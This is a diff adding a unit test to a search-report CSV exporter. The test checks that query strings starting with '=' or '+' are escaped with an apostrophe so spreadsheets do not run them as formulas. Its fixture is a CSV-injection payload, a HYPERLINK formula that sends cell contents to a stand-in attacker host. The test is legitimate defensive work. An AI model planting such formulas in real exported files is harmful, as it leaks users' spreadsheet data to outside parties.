@@ -123,6 +123,20 @@ describe('runSearchReport', () => {
     expect(csv[0].position).toBe('12.34')
   })
 
+  it('neutralises query strings a spreadsheet would execute as formulas', async () => {
+    const hostile = '=HYPERLINK("https://evil.example/?"&A2,"adopt me values")'
+    const client = fakeClient({
+      query: [row(hostile, 9, 90, 8), row('+1 pet value', 5, 50, 9), row('adopt me values', 1, 10, 10)],
+    })
+    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
+    for (const file of [`search-28d-queries-${DATE}.csv`, `search-28d-queries-pos-4-20-${DATE}.csv`]) {
+      const queries = parseCsvObjects(readFileSync(join(dir, file), 'utf8')).map((r) => r.query)
+      expect(queries).toContain(`'${hostile}`)
+      expect(queries).toContain("'+1 pet value")
+      expect(queries).toContain('adopt me values')
+    }
+  })
+
   it('writes totals with the window dates and rounded rates', async () => {
     const client = fakeClient({ totals: [{ clicks: 12, impressions: 3456, ctr: 0.0034722222, position: 14.567891 }] })
     await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
